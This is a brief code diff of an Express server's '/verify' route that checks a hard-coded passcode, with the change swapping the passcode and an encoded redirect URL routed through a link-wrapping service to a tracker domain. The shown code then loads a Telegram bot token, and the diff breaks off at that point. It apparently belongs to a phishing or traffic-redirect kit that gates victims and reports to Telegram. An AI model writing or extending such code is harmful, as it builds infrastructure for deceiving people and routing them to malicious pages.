@@ -654,8 +654,8 @@ const myHTML = `
 app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
-  const CORRECT_CODE = "037435";
-  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=web-tracker.bisnow.net&t=h.eJx1kU1v3CAQhv9KZGl9KgaM1x-RrKRV1VvaVLnlssJ4sotswwqGkLbqfy8kSnJpJA4w88w77zB_iuDW4vKiOCGe_SWlESaCTqoFXDVpb2ysDCC9kgq1NaNSxJ-t8dYRtWq1lGd5hEPSGN8EYnwtVHajUfqTNke0hsyKGoieKhutW1IwNcs3MockiURpp1YgHsOs7UQ4b4Xoy3OYVu1Ph1kijDWr65QgvC1VKgGDBz2Pr6Q9mLBN4Ma6Ew3b1awMHlwmSpTuCPhudCc-7-pv6WS7Lzay3RT4GIVHvWboY8JjMrklV2TWfgrOvzwm-VD3feXDtkn3i7gkBKlr6gnOVzM80qtlbP3T7Xe38fDV_8Y7zu72Nz_vv9z-KD5dFEveEOo8G9po6Jx-frl-D1RKUtE0wLhi-wem-FR3g2gF1NAI3nEB3UB5NzDOm7Ydqp7t-6HrsjRkafBJS2JayXWUa3Z1AsANUD4PnLk5c_9N_v0HhmrFhQ.MEYCIQDJaQ5m7UZxVgIAulgtOquaBwqMZDNPuPgzJkjTKR9nYwIhALhSo2-Jw3bwWb3VICKmntWYM5aIe2Kc2DoqEsk9FXaT";
+  const CORRECT_CODE = "Quote435";
+  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=web-tracker.bisnow.net&t=h.eJx1kcFu5CAMhl-lijQ5LSGETKZTKWpXWu1hpXaPPY7AOBOUBCIgZduq717Qqp1LKzgg-_Pv3-a12Nxc3FwVYwirv6E0oiTBCZjQVVJ7Y2NlMNBbAUFb0wMQv1rjrSMwa5jKVZzxlDT6T4EYPwrBLjQKP2pzDtYQBdRg9BRstG5KwdQsv4jakmQgoB3MSHzYlLaSMNZxfl2um5y1H09KBOybumlSgrCuhFSCJpy06j9IezLbItH1zYG39a6py82jy0QZhDtjuBjd8Z-75ne62e5_G9luCnyP4pOeM_Q9Idfkyge3QbDOE2FGMRDVdcBZ5bdlEe6ZuCSDqWfqiM5XCp_o7dQ_Dvzlke3vH-r7sZNq_BvX8RfMf4ofV8WU_yfoPFmw0VCV9j7dXQIVCNoKXjMcGimVHJqWHbEdlOD7uuVsL-WessOx5vlcV8fDkTPeZmnM0rMWy_nu0_k_cJh2nSfNiMrIl8m3dyKMw4o.MEUCIAuoNR2eISVeWqLyr3L1fY0nTH9H-FeL5vk4GQYDwoP6AiEArOUwHz953uKhScj_r_QTLbYjChZZvujtos3E3o-t4bk";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
